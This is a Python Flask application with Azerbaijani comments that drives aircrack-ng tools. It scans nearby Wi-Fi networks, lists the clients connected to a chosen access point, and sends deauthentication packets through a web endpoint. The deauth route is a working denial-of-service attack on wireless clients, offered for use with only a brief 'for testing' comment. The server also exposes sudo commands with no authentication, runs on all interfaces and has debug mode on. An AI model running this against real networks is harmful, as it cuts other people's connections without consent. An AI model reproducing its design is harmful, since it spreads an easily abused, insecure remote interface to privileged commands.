from flask import Flask, jsonify, render_template, request
from flask_cors import CORS
import subprocess
import threading
import os
import json
import re

app = Flask(__name__)
CORS(app)

class WiFiScanner:
    def __init__(self):
        self.scanning = False
        self.networks = []
        self.capture_process = None
        
    def scan_networks(self):
        """Ətrafdakı Wi-Fi şəbəkələrini skan edir"""
        self.scanning = True
        self.networks = []
        
        try:
            # Monitor mode aktivləşdir
            subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], 
                         capture_output=True, timeout=5)
            
            # 15 saniyə skan et
            result = subprocess.run(
                ["sudo", "timeout", "15", "airodump-ng", "wlan0mon"],
                capture_output=True, text=True, timeout=20
            )
            
            output = result.stdout
            self.parse_airodump_output(output)
            
        except Exception as e:
            print(f"Scan error: {e}")
        finally:
            self.scanning = False
            
    def parse_airodump_output(self, output):
        """Airodump-ng çıxışını parse edir"""
        lines = output.split('\n')
        parsing_networks = False
        
        for line in lines:
            # BSSID, Channel, Encryption, ESSID olan sətirləri tap
            if re.match(r'^[\s]*[0-9A-Fa-f]{2}:', line):
                parts = line.split()
                if len(parts) >= 6:
                    bssid = parts[0]
                    channel = parts[5] if len(parts) > 5 else '?'
                    encryption = parts[4] if len(parts) > 4 else '?'
                    essid = ' '.join(parts[14:]) if len(parts) > 14 else '[Hidden]'
                    
                    network = {
                        'bssid': bssid,
                        'essid': essid,
                        'channel': channel,
                        'encryption': encryption,
                        'signal': parts[2] if len(parts) > 2 else '?',
                        'status': 'active'
                    }
                    self.networks.append(network)
    
    def get_networks(self):
        return self.networks
    
    def get_clients(self, bssid, channel):
        """Hədəf şəbəkəyə qoşulmuş client-ları göstərir"""
        try:
            result = subprocess.run(
                ["sudo", "timeout", "10", "airodump-ng", "-c", str(channel), 
                 "--bssid", bssid, "wlan0mon"],
                capture_output=True, text=True, timeout=15
            )
            return result.stdout
        except:
            return "Error capturing clients"

scanner = WiFiScanner()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan')
def api_scan():
    if not scanner.scanning:
        thread = threading.Thread(target=scanner.scan_networks)
        thread.daemon = True
        thread.start()
        return jsonify({'status': 'started', 'message': 'Scan started'})
    return jsonify({'status': 'scanning', 'message': 'Already scanning'})

@app.route('/api/networks')
def api_networks():
    return jsonify(scanner.get_networks())

@app.route('/api/clients/<bssid>/<channel>')
def api_clients(bssid, channel):
    data = scanner.get_clients(bssid, channel)
    return jsonify({'clients': data})

@app.route('/api/deauth', methods=['POST'])
def api_deauth():
    """Deauth hücumu göndərir (test məqsədli)"""
    data = request.json
    bssid = data.get('bssid')
    count = data.get('count', 5)
    
    try:
        subprocess.run(
            ["sudo", "aireplay-ng", "-0", str(count), "-a", bssid, "wlan0mon"],
            capture_output=True, timeout=30
        )
        return jsonify({'status': 'success', 'message': f'Sent {count} deauth packets'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
